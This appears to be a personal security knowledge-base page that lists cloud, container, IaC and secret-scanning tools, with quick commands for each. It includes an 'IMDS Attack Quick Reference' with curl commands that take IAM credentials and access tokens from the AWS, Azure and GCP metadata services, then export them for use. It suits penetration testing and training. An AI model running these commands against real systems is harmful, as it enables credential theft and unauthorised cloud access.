---
type: section
room: green
tags: [green/tools]
---

# Green: Instruments

> [!quote]
> *"The whole art of detection lies in the power of observation."*

Cloud CLIs, container scanners, IaC tools, and pipeline security instruments.

---

## Inventory by Domain

### Cloud CLIs & Enumeration
| Tool | Role | Note |
|------|------|------|
| `aws-cli` | AWS API access | [[aws-cli]] |
| `az` | Azure CLI | [[azure-cli]] |
| `gcloud` | GCP CLI | [[gcloud]] |
| `pacu` | AWS exploitation framework | [[pacu]] |
| `ScoutSuite` | Multi-cloud security audit | [[scoutsuite]] |
| `Prowler` | AWS/Azure/GCP CIS audit | [[prowler]] |
| `cloudsplaining` | AWS IAM analysis | [[cloudsplaining]] |
| `enumerate-iam` | AWS IAM permission discovery | [[enumerate-iam]] |
| `s3scanner` | S3 bucket enumeration | [[s3scanner]] |

### Container & Kubernetes
| Tool | Role | Note |
|------|------|------|
| `trivy` | Image + IaC scanning | [[trivy]] |
| `grype` | Container vulnerability scan | [[grype]] |
| `syft` | SBOM generation | [[syft]] |
| `hadolint` | Dockerfile linting | [[hadolint]] |
| `kube-bench` | Kubernetes CIS benchmark | [[kube-bench]] |
| `kube-hunter` | Kubernetes penetration testing | [[kube-hunter]] |
| `falco` | Runtime container detection | [[falco]] |
| `kubectl` | Kubernetes CLI | [[kubectl]] |

### IaC Security
| Tool | Role | Note |
|------|------|------|
| `checkov` | Terraform/CF/K8s policy | [[checkov]] |
| `tfsec` | Terraform security scan | [[tfsec]] |
| `terrascan` | IaC compliance | [[terrascan]] |
| `cfn-nag` | CloudFormation security | [[cfn-nag]] |

### CI/CD & Secrets
| Tool | Role | Note |
|------|------|------|
| `gitleaks` | Secrets in git | [[gitleaks]] |
| `trufflehog` | Deep git history scan | [[trufflehog]] |
| `detect-secrets` | Pre-commit hook | [[detect-secrets]] |
| `semgrep` | SAST in CI | [[semgrep]] |

---

## Quick Commands

```bash
# === CLOUD ===

# Enumerate AWS identity
aws sts get-caller-identity

# List IAM permissions for current user
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query 'UserId' --output text)

# ScoutSuite — multi-cloud audit
scout aws --report-dir ./scoutsuite-report

# Prowler — AWS CIS benchmark
prowler aws --output-formats html,json

# === CONTAINER ===

# Trivy — scan Docker image
trivy image nginx:latest --severity HIGH,CRITICAL

# Trivy — scan IaC directory
trivy config ./terraform/ --severity HIGH,CRITICAL

# Kube-bench — K8s CIS
kube-bench run --targets master,node,etcd

# Kube-hunter — active K8s pentest
kube-hunter --remote <cluster_ip>

# === CI/CD ===

# Gitleaks — scan current repo
gitleaks detect --source . -v

# TruffleHog — full git history
trufflehog git file://. --only-verified --concurrency=10

# Semgrep CI scan
semgrep ci --config=p/default
```

---

## IMDS Attack Quick Reference

```bash
# AWS IMDSv1 (from SSRF or RCE inside EC2)
# Metadata
curl http://169.254.169.254/latest/meta-data/

# IAM role credentials (rotate quickly!)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# Use stolen credentials
export AWS_ACCESS_KEY_ID=<key>
export AWS_SECRET_ACCESS_KEY=<secret>
export AWS_SESSION_TOKEN=<token>
aws sts get-caller-identity

# Azure IMDS
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# GCP IMDS
curl "http://metadata.google.internal/computeMetadata/v1/instance/" -H "Metadata-Flavor: Google"
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
```

---

## Conventions

- **One note per tool**, named after the tool
- **Tags:** `#green/tool`, `#green/<domain>` e.g. `#green/cloud`, `#green/container`

↩ [[Green]] · [[Mind Palace]]